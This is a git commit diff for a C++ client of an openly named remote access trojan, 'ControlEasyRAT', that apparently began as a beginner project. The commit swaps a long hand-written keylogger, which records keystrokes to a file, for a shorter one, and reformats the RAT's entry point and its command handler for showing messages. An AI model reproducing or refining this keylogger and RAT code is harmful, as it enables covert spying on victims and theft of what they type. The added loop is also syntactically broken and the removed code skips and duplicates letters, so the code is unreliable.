7fb357de874332a77f152a562efa95023a1abb8a
Scripted <68810671+ScriptedDeveloper@users.noreply.github.com>
2021-07-03 18:08:51 +0200

    Added better way to log keys
    Needs recompiliation.
    Probably the last change for my old beginner project.

--- client/c++_rat/c++_rat/src.cpp
+++ client/c++_rat/c++_rat/src.cpp
@@ -18,208 +18,14 @@ public:
     json j;
     void keylogger() {
         while (true) {
-            Sleep(100);
-            if (GetKeyState('A') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'A';
-            }
-            else if (GetKeyState('B') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'B';
-            }
-            else if (GetKeyState('C') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'C';
-            }
-            else if (GetKeyState('D') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'D';
-            }
-            else if (GetKeyState('E') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'E';
-            }
-            else if (GetKeyState('F') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'F';
-            }
-            else if (GetKeyState('G') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'G';
-            }
-            else if (GetKeyState('H') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'H';
-            }
-            else if (GetKeyState('I') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'I';
-            }
-            else if (GetKeyState('J') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'J';
-            }
-            else if (GetKeyState('K') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'K';
-            }
-            else if (GetKeyState('L') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'L';
-            }
-            else if (GetKeyState('M') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'M';
-            }
-            else if (GetKeyState('O') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'O';
-            }
-            else if (GetKeyState('P') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'P';
-            }
-            else if (GetKeyState('Q') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'Q';
-            }
-            else if (GetKeyState('R') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'R';
-            }
-            else if (GetKeyState('S') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'S';
-            }
-            else if (GetKeyState('T') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'T';
-            }
-            else if (GetKeyState('U') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'U';
-            }
-            else if (GetKeyState('V') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'V';
-            }
-            else if (GetKeyState('V') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'V';
-            }
-            else if (GetKeyState('W') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'W';
-            }
-            else if (GetKeyState('X') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'X';
-            }
-            else if (GetKeyState('Y') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'Y';
-            }
-            else if (GetKeyState('Z') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'Z';
-            }
-            else if (GetKeyState('@') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '@';
-            }
-            else if (GetKeyState('!') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '!';
-            }
-            else if (GetKeyState('§') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '§';
-            }
-            else if (GetKeyState('%') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '%';
-            }
-            else if (GetKeyState('&') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '&';
-            }
-            else if (GetKeyState('/') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '/';
-            }
-            else if (GetKeyState('=') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '=';
-            }
-            else if (GetKeyState('(') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '(';
-            }
-            else if (GetKeyState(')') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << ')';
-            }
-            else if (GetKeyState('?') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '?';
-            }
-            else if (GetKeyState('ß') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << 'ß';
-            }
-            else if (GetKeyState('#') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '#';
-            }
-            else if (GetKeyState('*') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '*';
-            }
-            else if (GetKeyState('+') & 0x8000) {
-                ofstream write;
-                write.open("fun.txt", ios::app);
-                write << '+';
-            }
-        }   
+            if (_kbhit())
+                char key = getch();
+                ofstream file;
+                file.open("fun.txt", ios::app);
+                file << key;
+                file.close();
+                Sleep(100);
+        }
     }
     void sShowMessage(string x) {
         char message[256];
@@ -278,7 +84,7 @@ public:
                     file.close();
 
                 }
-                else if (j["show_message"] != ""){
+                else if (j["show_message"] != "") {
                     file.close();
                     string text;
                     sShowMessage(j["show_message"]);
@@ -298,11 +104,11 @@ public:
         }
     }
 
-    };
+};
 
-    int main(int argc, char* argv[]) {
-        system("title ControlEasyRAT Made by Scripted on GitHub");
-        rat obj;
-        obj.rat_main();
+int main(int argc, char* argv[]) {
+    system("title ControlEasyRAT Made by Scripted on GitHub");
+    rat obj;
+    obj.rat_main();
 
 };
